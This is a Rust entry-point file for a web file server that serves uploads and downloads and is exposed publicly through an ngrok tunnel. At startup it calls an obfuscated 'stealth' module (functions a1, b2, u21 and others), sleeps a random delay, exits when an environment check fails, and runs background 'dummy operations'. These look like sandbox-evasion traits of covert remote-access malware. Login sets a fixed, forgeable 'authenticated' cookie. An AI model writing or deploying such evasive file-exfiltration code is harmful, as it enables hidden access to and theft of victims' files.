mod auth;
mod config;
mod connectivity;
mod encryption;
mod file_server;
mod ngrok;
mod notification;
mod stealth;
mod utils;

use actix_web::{
    App, HttpServer, middleware,
    web::{self, Form},
    HttpResponse, cookie::Cookie,
};
use log::{info, error};
use rand::Rng;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::sleep;
use std::time::Duration;
use serde::Deserialize;
use askama::Template;
use crate::auth::{AuthState, LoginTemplate};
use crate::config::Config;
use crate::connectivity::ConnectivityMonitor;
use crate::file_server::FileServer;
use crate::ngrok::setup_ngrok_tunnel;
use crate::stealth::{a1, b2, c3, d4, u21, v22, perform_dummy_operations};
use crate::utils::find_available_port;

#[derive(Deserialize)]
struct LoginForm {
    username: String,
    password: String,
}

async fn login_page() -> HttpResponse {
    let template = LoginTemplate { error: None };
    match template.render() {
        Ok(body) => HttpResponse::Ok()
            .content_type("text/html; charset=utf-8")
            .body(body),
        Err(_) => HttpResponse::InternalServerError().finish(),
    }
}

async fn login_handler(
    form: Form<LoginForm>,
    auth_state: web::Data<AuthState>,
) -> HttpResponse {
    if auth_state.validate_user(&form.username, &form.password).await {
        HttpResponse::Found()
            .cookie(
                Cookie::build("zlt_session", "authenticated")
                    .path("/")
                    .secure(true)
                    .http_only(true)
                    .finish(),
            )
            .append_header(("Location", "/"))
            .finish()
    } else {
        let template = LoginTemplate {
            error: Some("Invalid username or password".to_string()),
        };
        match template.render() {
            Ok(body) => HttpResponse::Ok()
                .content_type("text/html; charset=utf-8")
                .body(body),
            Err(_) => HttpResponse::InternalServerError().finish(),
        }
    }
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    // Initialize logger
    env_logger::init_from_env(env_logger::Env::new().default_filter_or("info"));
    
    // Initialize random seed
    let sleep_time = {
        let mut rng = rand::thread_rng();
        rng.gen_range(5000..10000)
    };
    sleep(Duration::from_millis(sleep_time)).await;

    // Stealth checks
    if a1() {
        error!("Env check failed, exiting...");
        std::process::exit(1);
    }
    
    // Start dummy operations in background
    std::thread::spawn(move || {
        tokio::runtime::Runtime::new()
            .unwrap()
            .block_on(async {
                perform_dummy_operations().await;
            });
    });
    
    // Execute stealth functions
    b2().await;
    u21().await;
    c3().await;
    d4().await;
    v22().await;
    
    // Create config and auth state
    let mut config = Config::new();
    let auth_state = web::Data::new(AuthState::new());
    
    // Find an available port dynamically, starting with the configured port
    let preferred_port = config.port;
    let actual_port = find_available_port(preferred_port, None)
        .expect("Failed to find an available port");
    config.port = actual_port;
    
    let config = Arc::new(config);
    let file_server = Arc::new(Mutex::new(FileServer::new()));
    
    // Setup server
    let server_address = format!("0.0.0.0:{}", actual_port);
    info!("Service on {}", server_address);
    
    let config_clone = config.clone();
    let file_server_clone = file_server.clone();
    let auth_state_clone = auth_state.clone();
    
    let server = HttpServer::new(move || {
        App::new()
            .app_data(web::Data::new(config_clone.clone()))
            .app_data(web::Data::new(file_server_clone.clone()))
            .app_data(auth_state_clone.clone())
            .wrap(middleware::Logger::default())
            .wrap(middleware::DefaultHeaders::new().add(("X-Frame-Options", "DENY")))
            .service(
                web::resource("/login")
                    .route(web::get().to(login_page))
                    .route(web::post().to(login_handler))
            )
            .service(file_server::index)
            .service(file_server::download_folder)
            .service(file_server::preview)
            .service(file_server::upload_files)
            .service(file_server::download_file)
    })
    .bind(&server_address)?
    .run();
    
    // Setup ngrok and connectivity monitor in the background
    let config_clone = config.clone();
    tokio::spawn(async move {
        let sleep_time = {
            let mut rng = rand::thread_rng();
            rng.gen_range(500..1500)
        };
        sleep(Duration::from_millis(sleep_time)).await;
        
        // Initial ngrok setup
        let public_url = setup_ngrok_tunnel(config_clone.port).await;
        if !public_url.is_empty() {
            info!("Accessible at {}", public_url);
            
            // Start connectivity monitor
            let mut monitor = ConnectivityMonitor::new(config_clone.port);
            monitor.start_monitoring().await;
        } else {
            error!("Initial tunnel setup failed");
        }
    });
    
    // Wait for server to complete
    server.await
}
